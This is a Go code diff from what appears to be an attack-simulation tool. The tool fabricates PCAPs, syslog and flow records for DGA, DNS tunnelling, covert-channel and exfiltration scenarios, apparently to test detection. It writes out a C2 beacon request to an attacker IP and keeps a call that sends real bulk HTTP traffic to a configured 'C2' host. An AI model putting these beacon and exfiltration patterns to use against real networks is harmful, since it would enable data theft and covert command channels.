@@ -874,12 +874,25 @@ func runDGA(req AttackRequest) (*AttackResult, error) {
 			result.FlowCount += fc
 			result.EventIDs = append(result.EventIDs, fids...)
 		}
-		// PCAP: one representative NXDOMAIN lookup
+
+		// PCAP 1: DNS NXDOMAIN queries from infected host
 		if len(dgaDomains) > 0 {
 			path, _ := PCAPDNSQueryResponse(req.RunID, "dga", infectedIP, dnsDev.IPAddress, dgaDomains[len(dgaDomains)-1], true)
 			if path != "" {
 				result.PCAPFiles = append(result.PCAPFiles, path)
 			}
+		}
+
+		// PCAP 2: C2 callback — infected host connects to attacker after DGA resolution
+		c2Path, _ := PCAPGenericTCPExchange(
+			req.RunID, "dga_c2",
+			infectedIP, req.AttackerIP,
+			uint16(80),
+			[]byte(fmt.Sprintf("GET /gate.php?id=%s HTTP/1.1\r\nHost: %s\r\n\r\n", randomHexString(8), req.AttackerIP)),
+			[]byte("HTTP/1.1 200 OK\r\nContent-Length: 4\r\n\r\nslee"),
+		)
+		if c2Path != "" {
+			result.PCAPFiles = append(result.PCAPFiles, c2Path)
 		}
 	}
 
@@ -920,7 +933,7 @@ func runDNSTunnel(req AttackRequest) (*AttackResult, error) {
 
 		// PCAP (Option B — always generate)
 		if dnsDev != nil {
-			_, path, _ := PCAPDNSTunnel(infectedDev, dnsDev, domain, count)
+			_, path, _ := PCAPDNSTunnel(req.RunID, req.AttackerIP, infectedDev, dnsDev, domain, count)
 			if path != "" {
 				result.PCAPFiles = append(result.PCAPFiles, path)
 			}
@@ -959,9 +972,9 @@ func runHTTPCovertChannel(req AttackRequest) (*AttackResult, error) {
 		result.EventIDs = append(result.EventIDs, fids...)
 
 		// PCAP
-		reqPayload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nX-Custom-Data: %s\r\n\r\n", c2Dev.IPAddress, lastData))
+		reqPayload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nX-Custom-Data: %s\r\n\r\n", req.AttackerIP, lastData))
 		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
-		path, _ := PCAPGenericTCPExchange(req.RunID, "http_covert", infectedIP, c2Dev.IPAddress, 80, reqPayload, respPayload)
+		path, _ := PCAPGenericTCPExchange(req.RunID, "http_covert", infectedIP, req.AttackerIP, 80, reqPayload, respPayload)
 		if path != "" {
 			result.PCAPFiles = append(result.PCAPFiles, path)
 		}
@@ -1049,33 +1062,28 @@ func runExfilHTTP(req AttackRequest) (*AttackResult, error) {
 	defer panicHandler(traceFunc(), nil)
 	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
 	dataMB := getAttackParamInt(req.Params, "data_mb", 100)
-	c2Dev := getCCServer()
-	if c2Dev == nil {
-		return result, nil
-	}
+	fw := getFirewall()
 
 	for _, sourceIP := range req.TargetIPs {
 		sourceDev, _ := getDeviceByIP(sourceIP)
-		events := SyslogDataExfil(sourceDev, c2Dev.IPAddress)
+		events := SyslogDataExfil(sourceDev, req.AttackerIP)
 		result.SyslogCount += len(events)
 		for _, ev := range events {
-			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", sourceIP, c2Dev.IPAddress, "HTTPS", ev)
+			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", sourceIP, req.AttackerIP, "HTTPS", ev)
 			result.EventIDs = append(result.EventIDs, eventID)
 		}
 
-		exfilFlows := FlowExfil(sourceIP, c2Dev.IPAddress, uint32(dataMB*1024*1024))
-		fw := getFirewall()
-		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", sourceIP, c2Dev.IPAddress, "HTTPS", exfilFlows)
+		exfilFlows := FlowExfil(sourceIP, req.AttackerIP, uint32(dataMB*1024*1024))
+		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", sourceIP, req.AttackerIP, "HTTPS", exfilFlows)
 		result.FlowCount += fc
 		result.EventIDs = append(result.EventIDs, fids...)
 
-		// PCAP (Option B)
-		path, _ := PCAPExfil(req.RunID, sourceIP, c2Dev.IPAddress, 443, dataMB)
+		// PCAP: attacker trigger first, then infected host exfils data
+		path, _ := PCAPExfil(req.RunID, sourceIP, req.AttackerIP, 443, dataMB)
 		if path != "" {
 			result.PCAPFiles = append(result.PCAPFiles, path)
 		}
 
-		// Real packets (Option A — real HTTP POST with large body)
 		go sendRealHTTPExfil(realC2IP(), realC2Port(), dataMB)
 	}
 	return result, nil
